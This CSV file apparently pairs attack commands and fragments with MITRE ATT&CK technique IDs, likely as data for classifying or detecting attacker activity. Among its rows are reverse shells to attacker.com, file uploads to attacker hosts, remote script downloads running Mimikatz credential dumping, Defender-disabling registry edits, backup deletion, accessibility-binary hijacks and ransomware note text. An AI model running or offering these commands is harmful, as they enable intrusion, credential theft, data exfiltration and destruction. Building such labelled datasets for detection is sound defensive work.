command,mitre_id
"perl -e 'use Socket;$i=""attacker.com"";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",T1059
new-itemproperty $key$name -Name * -Value 2 -Type DWORD;,T1112
.timer,T1053
nc attacker.com 12345 </path/to/input-file,T1105
Driver,T1547
CrashReporter.exe,T1036
Find-AVSignature,T1027
C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe,T1218
"[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd",T1003
Disconnect-VIServer -Confirm:$false,T1562
.wsb,T1564
/var/root/.local/softwareupdate,T1543
/proc/<PID>/cmdline,T1036
aspell --conf /path/to/input-file,T1005
"wmic OS get Caption,OSArchitecture,Version",T1082
mkdir $output_folder,T1003
LVM_SORTITEMS,T1055
"php -r 'file_put_contents(""/path/to/output-file"", ""DATA"");'",T1222
psexec,T1570
ENMDSKS,T1135
reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”,T1547
/proc/[pid],T1055
"gdb -nx -ex 'dump value /path/to/output-file ""DATA""' -ex quit",T1222
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*,T1003
ZwQuerySystemInformation,T1106
cat >/path/to/temp-file.conf <<EOF,T1059
check_raid --extra-opts=@/path/to/input-file,T1005
EverNoteTrayUService,T1547
security,T1555
"var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();",T1059
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""ODSUUpdateXMLUrlFromOC"" -Value ""$remote_url"" -Type String -Force",T1105
wlanAPI,T1110
/var/log/shell.log,T1070
dist-packages,T1546
NetUserEnum,T1087
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1060
ssh_zcp,T1555
pnputil.exe -i -a $driver_path,T1547
"& ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula \\$target -w c:\ -c ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgt /user:$user_name /password:$password /domain:$domain /outfile:ticket.kirbi",T1550
Cscript.exe,T1216
ZwWriteVirtualMemory,T1055
screencapture $output_file,T1113
cp $cert_filename /usr/local/share/certs/,T1553
"reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion",T1518
AppCertDLLs,T1546
ScriptText=',T1546
%<malware_execution_folder>%\\CrashLog.txt,T1074
if [ -f /etc/mtab ]; then cat /etc/mtab >> $output_file; fi;,T1083
"cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com",T1216
cmstp.exe /nf,T1218
where /R C:\Users\ Bookmarks,T1217
msiexec /z {PATH_ABSOLUTE:.dll},T1218
"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file",T1059
".\rclone.exe copy --max-size 1700k ""$dir_to_copy"" $remote_share:test -v",T1567
"REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v $user_name$ /t REG_DWORD /d 0",T1564
"reg add ""HKCU\Software\Microsoft\Office\16.0\Word\Options"" /v STARTUP-PATH /t REG_SZ /d ""C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent"" /f",T1546
name: x,T1059
"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*",T1070
"Start-Process ""$Splashtop_Path""",T1219
first_run(),T1082
HKLM\SAM\SAM\Domains\Account\Users\*\V,T1003
StopUserModeBrowserInjection,T1036
sqlite3 /dev/null '.shell /bin/sh',T1059
system account remove,T1531
"$sheet.Cells.Item(1,1) = ""$uname""",T1204
SystemParametersInfoAPI,T1106
var rbc = Channels.newChannel(ws.openStream());,T1105
"bash -c 'echo ""$(</path/to/input-file)""'",T1005
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableOnAccessProtection"" -Value 1",T1562
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f",T1484
"mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))",T1218
for ($var = 1; $var -le $lockout_threshold; $var++) {,T1110
"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}",T1218
System info.txt,T1560
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,T1547
"puppet apply -e 'file { ""/path/to/output-file"": content => ""DATA"" }'",T1222
foreach ($ip in $ip_list) {,T1046
inv-phantom -consoleoutput -noninteractive,T1562
PowerShell -version 2 -command '$v2_command',T1562
WinDefService,T1036
reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f,T1112
"Write-Host ""Port $port is open on $ip""",T1046
Remove-Item $credFile,T1098
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > $output_file,T1074
"echo ""1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"" ""$env:APPDATA\Microsoft\Addins\notepad.ppam""",T1137
vi -c ':set shell=/bin/sh | shell',T1059
argv[0],T1036
certutil -verifyctl -split -f $remote_file,T1105
auditctl -D,T1562
HKLM\SYSTEM\Microsoft\Cryptography\MachineGUID,T1082
"New-ItemProperty ""HKCU:\Software\Policies\Microsoft\Windows\OOBE"" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force",T1562
rm -rf,T1070
$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug,T1106
%Program Data%,T1574
wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”,T1220
/proc/*/environ,T1083
wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer,T1218
halt -r,T1529
"Get-Item -Path ""HKLM:SYSTEM\CurrentControlSet\Control\SafeBoot""",T1012
.vcrd,T1555
"rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init""",T1564
/Library/Preferences/com.apple.loginwindow,T1564
echo '#\!/bin/sh' > $rc_service_path/$rc_service_file,T1543
scp $local_file $username@$remote_host:$remote_path,T1105
vShow,T1564
compmgmt.msc,T1053
sample,T1497
on MacOS can be used to list disks while,T1680
lwp-download file:///path/to/input-file /dev/stdout,T1005
.../Contents/MacOS/,T1553
tmp/tmpmnt/bin/samba_upgrade.tar,T1554
curl,T1048
"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",T1218
takeown /F %windir%\System32\osk.exe /A,T1546
C:\\Windows\\Temp\\cup.tmp,T1074
.xls,T1005
"Start-Process ""$webbrowserpassview_path""",T1555
"Write-Host ""Error parsing JSON data.""",T1539
New-Item -type Directory $ExcelRegPath | Out-Null,T1137
if ((${#HISTFILE[@]})); then echo $HISTFILE; fi,T1562
DeployJava.js,T1518
"gcloud iam roles create $role-name --description=""$role-description"" --permissions=$roles --project=$project-id",T1078
foreach($table in $tables) {,T1619
regkeyenum,T1012
iptables-save -f /path/to/output-file,T1222
&lt;executable&gt;,T1546
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap,T1112
tftp attacker.com,T1105
"""C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe""",T1222
pw useradd $username -g 0 -d /root -s /bin/sh,T1136
code.exe tunnel,T1219
/etc/ssh/sshd_config,T1098
"sc config W64Time DisplayName= ""Windows 64 Time""",T1543
NTDLL.dll,T1129
wmic bios get SMBIOSBIOSVersion,T1082
reg export HKLM\SOFTWARE\Microsoft\Evilreg $path\file.txt:evilreg.reg,T1564
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services \LanmanServer\Paramenters,T1112
setsockopt,T1205
"xattr -lr * / 2>&1 /dev/null | grep -C 2 ""00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00""",T1564
nft -f /path/to/input-file,T1005
"Start-Process -FilePath ""$env:comspec"" -ArgumentList ""/c,type,$payload_path,>,`""$ads_file_path:$ads_name`""""",T1564
FindFirstUrlCacheEntryA,T1106
GetKeyState,T1106
echo 'import requests' > $python_script_name,T1059
"Get-ADComputer $hostname -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",T1087
cp $HISTFILE $HISTFILE.OLD,T1562
kernel32.dll,T1497
HISTFILE,T1070
kextstat 2>/dev/null | grep SoftRAID,T1547
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin -Verbose,T1069
"Write-Host ""Registry value created: $newValueName with data $newValueData""",T1562
az ad user create --display-name $username --password $password --user-principal-name $userprincipalname,T1136
GetExtendedUdpTable,T1049
curl --upload-file,T1048
"echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> $path_to_systemd_timer",T1053
pktmon.exe start --etw,T1040
systemctl restart T1543.002,T1543
C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe,T1036
sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist,T1562
DevTunnel.exe,T1105
HKCU\Software\Backtsaleht\StubPath,T1547
"grep -E ""^[0-9a-f-]* r"" /proc/""$pid""/maps | cut -d' ' -f 1",T1003
sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt),T1036
ResourceGroup = $account.resourceGroup,T1619
InternetQueryOptionA,T1016
.zshrc_aliases,T1546
mdfind,T1083
MsMpEng.exe,T1574
"cmd /r cmd<""$input_file""",T1059
sudo tcpdump -c 5 -nnni $interface,T1040
"""$recon_commands""",T1016
RestrictedAdmin,T1550
install -m 6777 /path/to/input-file /path/to/output-dir/,T1548
ExchangePowerShell,T1070
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {,T1564
"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f",T1112
WaitForSingleObject,T1106
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file,T1222
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t,T1546
"Send-MailMessage -From $sender -To $receiver -Subject ""T1048.003 Atomic Test"" -Attachments $input_file -SmtpServer $smtp_server",T1048
/tmp/art.sh,T1027
echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash,T1222
iptables -D OUTPUT -p tcp --dport 21 -j DROP,T1562
<owner>0</owner>,T1222
xargs -a /path/to/input-file -0,T1005
"powershell.exe /c ""Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''""",T1518
"Runtime.getRuntime().exec(""/path/to/command"");",T1059
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",T1105
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableUnsafeLocationsInPV"" -Value ""1"" -PropertyType ""Dword""",T1562
touch x.yara,T1005
C:\ProgramData\Adobe\temp,T1074
$HKLM\SOFTWARE\Classes\Interface\,T1480
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f",T1112
kl.ps1,T1056
"Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" -Force -Recurse",T1555
OutputDebugStringW,T1106
"perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>""attacker.com"", PeerPort=>80, Proto=>""tcp"") or die;open(my $file, ""<"", ""/path/to/input-file"") or die;$content = join("""", <$file>);close($file);$headers = ""POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "" . length($content) . ""\r\nConnection: close\r\n\r\n"";print $s $headers . $content;while (<$s>) { }close($s);'",T1105
"echo ""$command"" >> /var/spool/cron/crontabs/$cron_script_name",T1053
odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},T1218
net stop w32time,T1547
systemctl stop,T1569
busybox nc -e /bin/sh attacker.com 12345,T1059
zsh -c '</path/to/input-file',T1005
add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename,T1553
fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},T1485
PS_ScheduledTask,T1053
ptx -w 999 /path/to/input-file,T1005
"Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""",T1012
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRoutinelyTakingAction"" -Value 1",T1562
LD_PRELOAD,T1574
gsettings,T1564
"$sheet.Cells.Item(20,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"")""",T1204
pkexec /bin/sh,T1059
Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden,T1564
certutil -decode {PATH:.base64} {PATH},T1140
Start-Process -FilePath $parent_name -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line',T1134
C API,T1559
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile $extract_path\SYSTEM_HIVE,T1003
powershell.exe Get-Service,T1007
git branch --help config,T1548
Sub AutoExec(),T1137
diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},T1105
IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,T1680
sc start,T1569
Invoke-WebRequest -Uri $destination_url -Method POST -Body $cyphertext -DisableKeepAlive,T1132
"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:$remote_payload""",T1216
Library/LaunchDaemons,T1543
C:\inetpub\wwwroot\aspnet_client\system_web\IISpool.aspx,T1105
gcloud config set project $project-id,T1078
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}',T1005
dsenableroot #current user,T1078
dscl . -create /Users/AtomicUser PrimaryGroupID 503,T1078
"Write-Host ""PID: $($process.Id)""",T1562
./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force,T1562
HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics,T1547
certutil.exe -p $password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 $output,T1552
partner,T1548
copy C:\Windows\System32\cmd.exe C:\lsm.exe,T1036
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""",T1137
vssadmin resize shadowstorage,T1490
"rundll32.exe advpack.dll,LaunchINFSection ""$inf_to_execute"",DefaultInstall_SingleUser,1,",T1218
git diff /dev/null /path/to/input-file,T1005
kittenz -consoleoutput -noninteractive,T1555
%USERNAME%,T1033
upload,T1140
SYSTEM\CurrentControlSet\Control\Lsa Name,T1012
Get-AzurePasswords -subscription '$subscription_id' > $output_file,T1555
net.exe start >> $output_file,T1007
jshell,T1005
"if [ -f /tmp/poc.txt ]; then echo ""Success: poc.txt created under /tmp\n"" $(ls -la /tmp/ | grep -w poc.txt); else echo ""Failed: /tmp/poc.txt not found""; fi",T1546
wbadmin delete systemstatebackup -keepVersions:0,T1490
whois -h attacker.com -p 12345 DATA,T1105
ln -sf /dev/null $history_path,T1070
route,T1016
"net group ""Domain computers""",T1018
HKLM\Software\NFC\IPA,T1012
Rt1AdjustPrivilege,T1106
closeanddeletestorage,T1070
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Run""",T1012
"Set-Location ""PathToAtomicsFolder\..\ExternalPayloads""",T1550
bcdedit.exe /set {default} recoveryenabled no,T1490
linker,T1027
C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup,T1547
"Write-Output ""Shared key access is disabled for this storage account.""",T1528
ls -l $test_folder,T1560
System.Net.NetworkInformation.Ping,T1018
Invoke-SMBExec,T1550
sudo unlink $system_log_path,T1070
rsyslogd -f /path/to/temp-file,T1059
"sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto",T1574
"$resourceAccess.Type = ""Role""",T1098
"healthCheck.type = ""tcp""",T1046
w3esvc,T1543
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:$file_url"").Exec();window.close();",T1218
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe,T1546
dscl . list /Users,T1087
"usermod --expiredate ""99999"" art",T1078
Ldifde -i -f {PATH:.ldf},T1105
/var/run/initd.lock,T1480
dir /s * .xml,T1552
Get-NetDomainTrust,T1482
chown $owner $file_or_folder,T1222
C:\PerfLogs\1\,T1074
Winlangdb.pdb,T1036
eqn /path/to/input-file,T1005
$requiredGraphAccess.ResourceAccess.Add($resourceAccess),T1098
"echo -e 'package main\nimport ""os""\nfunc main(){\n\tf, _ := os.OpenFile(""/path/to/output-file"", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte(""DATA\\n""))\n\tf.Close()\n}' >/path/to/temp-file.go",T1222
wsreset.exe,T1548
echo /bin/sh >/path/to/temp-file,T1059
OracleOcilib,T1012
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",T1218
suspicious,T1564
dsquery subnet,T1018
/c cd /d c:\windows\temp\ & copy \\<IP ADDRESS>\c$\windows\system32\devmgr.dll \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1 /y,T1070
"else: import urllib as u, urllib2 as r",T1105
ProgramData\Microsoft\PlayReady,T1036
Get-ADComputer $hostname -Properties *,T1087
kextstat,T1652
check_statusfile /path/to/input-file,T1005
ping %REMOTE_HOST%,T1018
$xlApp.DisplayAlerts = $False,T1204
start-stop-daemon -S -x /bin/sh,T1059
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I,T1053
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,T1547
cmstp.exe /ni /s {REMOTEURL:.inf},T1218
zypper x,T1059
"copy ""$filename"" %TEMP%\LibHello.js",T1127
"Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""",T1046
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application,T1562
[string]$directory,T1005
msbuild.exe {PATH:.csproj},T1127
"Import-Module ""PathToAtomicsFolder\T1526\src\AzureDiscovery.ps1""",T1526
esxcli system syslog config set,T1562
Set-PSReadlineOption -HistorySaveStyle SaveNothing,T1070
winlogon.exe,T1531
api.apple-cloudkit.com,T1553
DnsQuery_A,T1106
certoc.exe -GetCACAPS {REMOTEURL:.ps1},T1105
ie4uinit.exe -BaseSettings,T1218
"([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()",T1069
ginsh,T1059
"if(-not $excelApp.path.contains(""Program Files (x86)"")){",T1137
pax -w /path/to/input-file | tar -xO,T1005
"Write-Host ""Process started successfully with Process ID: $($Result.ProcessId)""",T1546
Update.exe --update={REMOTEURL},T1218
HKLM\SECURITY\Policy\Secrets\*\OldVal,T1003
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d ""1"" /f",T1222
echo '#!/bin/sh' >/path/to/temp-file,T1059
del,T1485
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders,T1060
gdi32,T1113
cat $input_folder/$input_file.enc | base64,T1560
CSIDL_APPDATA\microsoft\security,T1036
/var/folder,T1074
New-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force,T1562
grep '' /path/to/input-file,T1005
Get-ChildItem Env: > $env:TEMP\T1119_2.txt,T1119
os.popen,T1057
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,T1222
%USERPROFILE%\AppData\Local\Google\Chrome\User Data\LocalState,T1217
"sc config $service_name binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\""""",T1543
check_memory --extra-opts=@/path/to/input-file,T1005
"grep ""# THIS IS A COMMENT"" /etc/ufw/user.rules",T1562
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",T1218
hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist,T1222
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"" /v Configuration /t REG_SZ /d malware_test /f",T1546
Process = if ($p) { $p.ProcessName } else { $null },T1049
Remove-Item $fname,T1204
be_BY,T1614
"Write-Host ""IP addresses extracted and saved to $outputFilePath""",T1560
C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q,T1070
nm /path/to/input-file,T1005
winmail.dat,T1036
"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs,T1027
echo executing:schtasks /query /S $target.$domain,T1558
export $proxy_scheme_proxy=$proxy_server:$proxy_port,T1090
webhook.site,T1567
cat prefixaasuffix,T1005
pandoc -L /path/to/temp-file /dev/null,T1548
useradd -g 0 -M -d /root -s /bin/bash $username,T1136
if($delete_defender_folder){,T1562
net user $ ATOMIC123! /add /active:yes,T1564
Invoke-PSRemoting,T1059
pyright /path/to/input-file,T1005
software\microsoft\windows\currentversion\run\microsoft windows html help,T1547
HKEY_CURRENT_USER\Software\Classes\CLSID\{E6D34FFC-AD32-4d6a-934C-D387FA873A19},T1546
nltest.exe /domain_trusts,T1482
PubPrn.vbs,T1216
lxc init x x -c security.privileged=true,T1059
var FileWriter = Java.type('java.io.FileWriter');,T1222
comsvcs.dll,T1003
GetTcpTable,T1018
"Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction",T1053
cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file,T1005
kubectl get pods --kubeconfig=/path/to/temp-file,T1059
docker build -t t1046 $PathToAtomicsFolder/T1046/src/,T1046
Get-WmiObject win32_bios,T1082
rcsi.exe {PATH:.csx},T1127
break,T1110
"1..100 | ForEach-Object { Add-Content -Path $filepath -Value ""This is line $_."" }",T1041
"Get-ChildItem -Path ""HKLM:system\currentcontrolset\services""",T1012
"echo ""Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: "" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
ldconfig -f /path/to/temp-file,T1574
HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe,T1547
Set-PSReadLineOption -AddToHistoryHandler { return $false },T1070
sudo /bin/sh,T1059
podman run,T1543
NtQueryInformationProcess,T1106
"Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""",T1046
docker exec t1046_container /scan.sh,T1046
"trap 'echo ""$(date +""%d/%m/%y %H:%M:%S.%s"") $USER $BASH_COMMAND"" >> $output_file' DEBUG",T1056
extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},T1105
APPX.%x%x%x%x%x.tmp,T1074
wmic DISKDRIVE get Caption,T1082
SCHTASKS /Change,T1036
"""$psexec_path"" /accepteula \\$machine -c $mimikatz_path ""lsadump::lsa /inject /id:500"" ""exit""",T1055
$User,T1136
find $search_path -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} $output_folder \;,T1552
/c cd /d c:\windows\temp\ & reg query HKEY_CURRENT_USER\Software\<username>\PuTTY\Sessions\,T1012
curl -X POST --data-binary @/path/to/input-file http://attacker.com,T1105
HKCU\Software\Microsoft\Windows\Run,T1547
then sed -i '$ a #art_test_1562_006_1' /etc/$auditd_config_file_name,T1562
IEX (New-Object Net.WebClient).DownloadString('$remote_script'); Invoke-Mimikatz -DumpCreds,T1003
cmd.exe /c ping %userdomain%,T1016
nc -nv $host $port,T1046
ntdsutil.exe,T1003
"if (test-path ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"") {copy-item ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"" -destination ""$exfil_folder\T1555.003Edge_Login Data""} else {}",T1555
ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host,T1222
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p',T1005
whois -h attacker.com -p 12345 x,T1105
netsh wlan show profiles,T1016
bash $TMPFILE,T1059
Get-WebServicesVirtualDirectory,T1083
"find $file_path/.config/gcloud -name ""credentials.db"" -o -name ""access_tokens.db"" -type f 2>/dev/null",T1552
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,T1547
"while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)",T1573
echo '#' >> $rc_service_path/$rc_service_file,T1543
sqlite3 <<EOF,T1005
tempFiles,T1074
easy_install .,T1548
.doc,T1005
RBCD-Check -consoleoutput -noninteractive,T1082
SIGTTIN,T1564
echo '$command_to_add' >> ~/.shrc,T1546
"Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe""",T1055
"Write-Output ""Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...""",T1530
"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableRemoteDesktopAntiAlias"" /t REG_DWORD /d 1 /f",T1112
"path=%path%;""C:\Program Files (x86)\winzip""",T1560
sc create “SysUpdate” binpath= “cmd /c start “[file path]””&&sc config “SysUpdate” start= auto&&net,T1543
Dij,T1055
xmore /path/to/input-file,T1005
hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom,T1546
valgrind /bin/sh,T1059
"Start-Hollow -Sponsor ""$sponsor_binary_path"" -Hollow ""$hollow_binary_path"" -ParentPID $ppid -Verbose",T1055
lxc exec x /bin/sh,T1059
